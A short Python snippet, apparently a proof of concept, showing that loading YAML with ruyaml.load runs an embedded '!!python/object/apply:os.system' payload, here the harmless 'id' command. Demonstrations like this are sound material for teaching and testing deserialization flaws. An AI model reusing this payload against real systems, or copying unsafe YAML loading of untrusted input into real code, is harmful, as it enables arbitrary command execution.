import ruyaml
payload = """!!python/object/apply:os.system ["id"]"""
data = ruyaml.load(payload)
print(data)  # executes system command
